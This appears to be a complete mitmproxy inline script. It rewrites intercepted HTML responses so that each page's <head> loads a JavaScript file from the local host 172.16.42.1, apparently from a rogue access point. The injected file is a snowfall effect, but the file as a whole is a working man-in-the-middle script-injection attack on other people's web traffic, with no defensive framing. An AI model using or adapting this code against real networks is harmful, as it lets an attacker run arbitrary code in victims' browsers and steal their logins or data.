import re
import subprocess

def response(ctx, flow):
 try:
  if re.match('text/html',flow.response.headers["content-type"][0]):
   flow.response.decode()
   oldtxt = flow.response.content
   newtxt = oldtxt.replace('<head>','<head><script src="http://172.16.42.1/snowstorm.min.js"></script>')
   flow.response.content=str(newtxt)
	
 except IndexError:
  ctx.log("no content-type[0]")
